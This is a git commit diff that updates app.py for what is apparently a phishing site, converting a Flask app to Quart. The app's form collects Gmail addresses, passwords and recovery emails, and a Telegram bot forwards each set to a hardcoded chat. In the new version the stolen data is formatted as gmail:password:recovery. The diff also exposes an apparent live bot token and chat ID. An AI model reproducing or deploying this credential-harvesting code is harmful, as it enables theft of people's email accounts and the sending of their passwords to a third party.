ed04fffdd605050fdcc6dd0ae4755fff3bb6c0fb
alim920622 <121553733+alim920622@users.noreply.github.com>
2025-02-21 23:43:13 +0500

    Update app.py

--- app.py
+++ app.py
@@ -1,32 +1,33 @@
 import os
-from flask import Flask, render_template, request
+from quart import Quart, render_template, request
 from telegram import Bot
 
-app = Flask(__name__)
+app = Quart(__name__)
 
-# Токен твоего Telegram-бота, который ты получил от BotFather
-TOKEN = "7432054726:AAFnkMq3_C7iiKbRNY6mhNGb_kvx74Nxa54"
-CHAT_ID = "1361079299"  # Это твой chat_id для избранных сообщений
+# Путь к Telegram Bot API Token
+telegram_token = '7432054726:AAFnkMq3_C7iiKbRNY6mhNGb_kvx74Nxa54'
+chat_id = '1361079299'
 
-bot = Bot(token=TOKEN)
+# Создание экземпляра Telegram бота
+bot = Bot(token=telegram_token)
 
 @app.route("/", methods=["GET", "POST"])
-def form():
+async def form():
     if request.method == "POST":
-        gmail = request.form.get("gmail")
-        password = request.form.get("password")
-        recovery_email = request.form.get("recovery_email")
+        gmail = await request.form.get("gmail")
+        password = await request.form.get("password")
+        recovery_email = await request.form.get("recovery_email")
 
-        # Формируем сообщение для отправки в "Избранное"
-        message = f"Your Gmail account: {gmail}\nPassword: {password}\nRecovery email: {recovery_email}"
-
-        # Отправка сообщения в "Избранное" (Saved Messages)
-        bot.send_message(chat_id=CHAT_ID, text=message)
+        # Формирование сообщения для отправки в Telegram
+        message = f"\n{gmail}:{password}:{recovery_email}"
+        
+        # Асинхронная отправка сообщения в Telegram
+        await bot.send_message(chat_id=chat_id, text=message)
 
         # Отображение страницы с успешной отправкой данных
-        return render_template("success.html", gmail=gmail, recovery_email=recovery_email)
+        return await render_template("success.html", gmail=gmail, recovery_email=recovery_email)
 
-    return render_template("form.html")
+    return await render_template("form.html")
 
 if __name__ == "__main__":
     app.run(debug=True, host='0.0.0.0', port=int(os.environ.get("PORT", 5000)))
